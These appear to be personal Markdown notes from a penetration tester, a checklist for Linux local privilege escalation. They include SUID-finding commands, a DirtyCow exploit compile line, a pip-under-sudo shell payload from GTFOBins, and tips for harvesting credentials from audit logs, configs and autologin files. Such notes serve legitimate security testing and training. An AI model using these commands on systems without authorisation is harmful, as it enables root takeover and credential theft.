# Local Priv Esc
#linux #lpe
https://gtfobins.github.io/
https://lolbas-project.github.io/#
https://book.hacktricks.xyz/linux-unix/privilege-escalation

- Get OS information
- Check if the sudo version is vulnerable
	- sudo -v
	- sudo -l
- Check the PATH, any writable folder?
	- `set`
- Check env variables, any sensitive detail?
- Search for kernel exploits using scripts (DirtyCow?)
	- https://www.exploit-db.com/exploits/40839
	- gcc -pthread shell.c -o dirty -lcrypt
- Dmesg signature verification failed error?
- More system enum (date, system stats, cpu info, printers)
- Enumerate more defenses
	- #LinPEAS: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh


# Sticky-Bit

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## Unsanitized paths
#unsanitizedpath #path
See [[Unsanitized Path]].

# Find files belonging to user

`find / -user <user> 2>/dev/null | egrep -v "proc|venv"`
`find / -group <group> 2>/dev/null | egrep -v "proc|venv"`

`find / -user marcus 2>/dev/null | egrep -v "proc|venv"`

# Exploit via Path if SUID-Binary does not use full path
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

# Exploit lxd group
https://www.hackingarticles.in/lxd-privilege-escalation/

# pip
`pip3 install <local_dir>` searches the local dir for a setup.py and executes it. Helpful if pip is in the sudoers or sbit.

Alternative (https://gtfobins.github.io/gtfobins/pip/):

`TF=$(mktemp -d)`
`echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
`sudo -H /usr/bin/pip3 install $TF`

# Audit-Logs
grep audit-logs for "data=" and decode as hex. Might contain passwords

# Docker
See [[Docker]].

# Search for credentials
## DBs
If mysql or mariadb is running, search for credentials in the config files for web apps. Sometimes there are hashes to crack and password reuse is a steady friend.

# Check for autologin
- Check for autologin
- `/etc/autologin`

# Magic grep
`grep -r 'keyword' /`
`grep 'keyword' /etc -R 2>/dev/null`

# Systemd services
Check `/etc/systemd/` services for custom ones.